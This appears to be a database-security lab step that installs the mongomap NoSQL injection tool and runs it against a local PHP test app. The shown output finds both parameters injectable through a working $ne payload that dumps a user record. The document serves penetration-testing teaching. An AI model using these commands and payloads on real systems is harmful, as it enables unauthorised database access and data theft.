# DBSec10 - prepare noSQL injection with mongomap

mongomap can be used as noSQL injection penetration test tool

all actions on OpenStack platform as superuser
```bash
sudo -s
cd /usr/local/src
git clone https://github.com/Hex27/mongomap.git
cd mongomap
# colorama is a module, which mongomap depends on
pip3 install colorama
# there is a bug in the regexArrayBlindInjection file, which needs to be marked as regex with an "r" prefix
sed -i 's/charset = "abcdefghijklmnopqrstuvwxyz/charset = r"abcdefghijklmnopqrstuvwxyz/' tests/regexArrayBlindInjection.py
python3 mongomap.py -u http://localhost/php-quickstart/quickstart.php --method post --data "name=dummy&course=unknown"
```

expected output is, that the first user is found and both parameters are classified as being injectable

>[*] Test phase completed.
>
>[+] Vulnerable Parameters:
>[+] name
>[+] - Not-Equals Array (param[$ne]) Injection
>[+] course
>[+] - Not-Equals Array (param[$ne]) Injection
>
>[i] Attempting to dump data...
>[*] Parameter: name
>
>[*] Attemping dump with Not-Equals Array (param[$ne]) Injection on param name
>
>
>[+] Not-Equals Array (param[$ne]) Injection for name has retrieved:
>[+]
>[+]     For payload: name[$ne]=admin&course[$ne]=dummy
>[+]
>[+]     Content Difference:
>[+]     Welome, John Doe!
>[+]
 